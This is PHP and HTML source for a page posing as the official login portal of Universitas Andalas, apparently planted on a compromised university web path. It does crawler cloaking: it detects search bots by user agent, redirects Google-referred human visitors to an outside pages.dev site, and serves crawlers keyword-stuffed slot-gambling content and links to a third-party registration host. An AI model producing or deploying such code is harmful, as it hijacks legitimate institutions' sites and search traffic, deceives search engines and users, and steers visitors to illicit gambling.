<?php
$bot_list = array('Googlebot', 'Bingbot', 'Slurp');
...
if ($is_google_referer && !$is_bot) {
    header("Location: https://pdk-unanddisini.pages.dev/"); // Ganti dengan URL tujuan
    exit();
}
...
$baseAuthor = $BRAND;
$URL  = "https://pdk.unand.ac.id/disini/?login=$BRAND";
$PAGEURL = "https://pdk.unand.ac.id/disini/?login=$BRAND";
$AMP = "https://pdk-unanddisini.pages.dev/?login=$BRAND";
$DAFTAR = "https://projekce.devel.jsns.cz/www/fkfk.php";
$BANNER = "https://i.imgur.com/DqljTa2.jpeg";
$LOGO = "https://www.googlecloudcommunity.com/gc/image/serverpage/image-id/91721i448433AD6940C7A7/image-size/large/is-moderation-mode/true?v=v2&px=999";
$keyword = "$brand, login $brand, daftar $brand, situs $brand, rtp $brand, link alternatif $brand";

if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND Login Aplikasi Resmi Universitas Andalas ";
    $DESCRIPTION = "$BRAND Selamat datang di Login Aplikasi Resmi Universitas Andalas! Universitas Andalas yang telah berdiri sejak 13 September 1956 merupakan kampus tertua di luar pulau Jawa dan merupakan salah satu kampus terbaik di Indonesia.";
    $description = "$BRAND Selamat datang di Login Aplikasi Resmi Universitas Andalas! Universitas Andalas yang telah berdiri sejak 13 September 1956 merupakan kampus tertua di luar pulau Jawa dan merupakan salah satu kampus terbaik di Indonesia.";
}
...
<!doctype html>
  ...
  <head>
    ...
    <meta name="twitter:wwwwwwwwwww" content="<?php echo $TITLE ?>" />
  ...
  .n-columns-2 {
    ...
    .login, .login-button {
      background: linear-gradient(to bottom, #26ffcf 0%, #26ffcf 100%);
                  ...
                  <div class="header-title-logo">
                    <a href="<?php echo $URL ?>" data-animation-role="header-element">
                      ...
                      <img elementtiming="nbf-header-logo-desktop"
                        src="https://www.googlecloudcommunity.com/gc/image/serverpage/image-id/91721i448433AD6940C7A7/image-size/large/is-moderation-mode/true?v=v2&px=999"
                        alt="<?php echo $BRAND ?>" style="display:block" fetchpriority="high" loading="eager" decoding="async"
                        data-loader="raw">
                  ...
                  <article
                    ...
                    <nav class="ProductItem-nav">
                      <div class="ProductItem-nav-breadcrumb" data-animation-role="content">
                        ...
                        <a href="/store/p/zeus" class="ProductItem-nav-breadcrumb-link"><?php echo $TITLE ?></a>
                      </div>
                        ...
                        <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">
                          ...
                          <div class="ProductItem-gallery-slides-item" data-slide-index="1"
                            ...
                            <img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b"
                              ...
                              data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo $BRAND ?>"
                                      ...
                                      <div class="gallery-lightbox-item-src">
                                        <div class="gallery-lightbox-item-img content-fit">
                                          <img
                                            ...
                                            alt="<?php echo $BRAND ?>" data-load="false" elementtiming="nbf-product-lightbox" /></div>
                                      </div>
                                    </div>
                                  </figure>
  ...
  <small class="copyright__content"><a href="<?php echo $URL ?>" title="Daftar Slot Online">Copyright ©2024 <?php echo $BRAND ?></a></small>
      </footer>
